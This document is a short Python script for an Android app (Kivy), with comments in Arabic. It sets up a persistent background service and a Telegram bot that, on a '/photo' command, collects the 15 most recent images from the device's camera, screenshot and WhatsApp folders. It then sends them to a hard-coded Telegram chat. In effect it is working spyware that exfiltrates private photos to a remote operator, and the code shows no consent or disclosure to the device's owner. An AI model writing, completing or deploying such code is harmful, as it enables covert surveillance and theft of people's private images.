import os
import time
import requests
from telebot import TeleBot
from jnius import autoclass

# --- الإعدادات (تأكد من صحتها) ---
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902" # توكن بوتك
CHAT_ID = "6110903337" # الأيدي الخاص بك
bot = TeleBot(BOT_TOKEN)

# استدعاء أدوات النظام لضمان البقاء في الخلفية
PythonService = autoclass('org.kivy.android.PythonService')
PythonService.mService.startForeground(1, None) # تشغيل كخدمة أمامية

def get_latest_photos():
    paths = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots",
        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
    ]
    photo_files = []
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                    full_path = os.path.join(path, file)
                    photo_files.append((full_path, os.path.getmtime(full_path)))
    
    photo_files.sort(key=lambda x: x[1], reverse=True)
    return [x[0] for x in photo_files[:15]]

@bot.message_handler(commands=['photo'])
def send_photos(message):
    photos = get_latest_photos()
    if not photos:
        bot.reply_to(message, "No photos found.")
        return
    
    for photo_path in photos:
        try:
            with open(photo_path, 'rb') as img:
                bot.send_photo(CHAT_ID, img)
            time.sleep(0.5) # فاصل زمني بسيط لمنع الحظر
        except Exception as e:
            print(f"Error sending {photo_path}: {e}")

# حلقة تكرار ذكية لمنع توقف الخدمة
if __name__ == '__main__':
    while True:
        try:
            bot.polling(none_stop=True, interval=2, timeout=20)
        except Exception as e:
            time.sleep(5) # في حال انقطع الإنترنت، ينتظر 5 ثواني ويعيد المحاولة
